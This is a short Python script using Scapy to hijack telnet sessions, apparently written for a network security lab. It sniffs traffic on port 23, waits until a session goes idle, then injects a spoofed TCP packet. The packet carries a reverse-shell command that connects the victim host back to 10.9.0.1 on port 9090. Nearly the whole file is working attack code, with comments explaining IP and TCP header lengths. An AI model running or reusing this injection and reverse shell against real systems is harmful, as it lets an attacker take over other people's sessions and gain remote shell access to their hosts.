from scapy.all import *

interface = "br-08174a224f46"
dstPORT = "23" # telnet port

dest_record = {}

def do_hijack(pkt):
    print(pkt[IP].dst)
    key = pkt[IP].dst
    if key not in dest_record:     # freshman
        dest_record[key] = 0
        return
    else:
        if dest_record[key] < 0:   # prior victim [we have just perform the attack]
            return
        if dest_record[key] <= 50: # wait for logging
            dest_record[key] += 1
            print(dest_record[key])
            return
            # inside this fields we have the number of "WORDS" and a word is 32bits = 4 byte. Since 8bits is 1 byte.
            # So a header 5 words long is 20 bytes and a 15 words header is 60 bytes.
        if 4*pkt[IP].ihl+4*pkt[TCP].dataofs != pkt[IP].len:  # exist content (we wait till the packet.data is empty to will not have problem during the hijacking)       
            # IP PACKET
                # Internet Header Length (IHL)
                # The IPv4 header is variable in size due to the optional 14th field (options). 
                # The IHL field contains the size of the IPv4 header, it has 4 bits that specify the number of 32-bit words in the header. 
                # The minimum value for this field is 5, which indicates a length of 5 × 32 bits = 160 bits = 20 bytes. As a 4-bit field, 
                # the maximum value is 15, this means that the maximum size of the IPv4 header is 15 × 32 bits = 480 bits = 60 bytes.

            # TCP packet
                # dataofs data off set
                # is the length of TCP header.
                # The purpose of the data offset is to tell the upper layers where the data starts. 
                # the TCP header can be anywhere from 5-15 words long. So you need to know where the header ends and the data begins. 
                
                # the word unit is defined as 32 bits.
                # Since 1 byte = 8 bits, a word is 4 bytes.
                # So a header 5 words long is 20 bytes and a 15 words header is 60 bytes.
            print(pkt[IP].ihl, pkt[TCP].dataofs, pkt[IP].len)
            return
        else:
            dest_record[key] = -1   # attack

    ip = IP(id=pkt[IP].id+1, src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
            seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=0x18) # 0x18 = 24 --> ACK/PSH
    raw = Raw(load='\r\n/bin/bash -i  > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n')
    pkt = ip/tcp/raw
    # ls(pkt)
    send(pkt, verbose=0)
    print('attacked', key)

sniff(iface=interface, filter='dst port ' + dstPORT, prn=do_hijack)
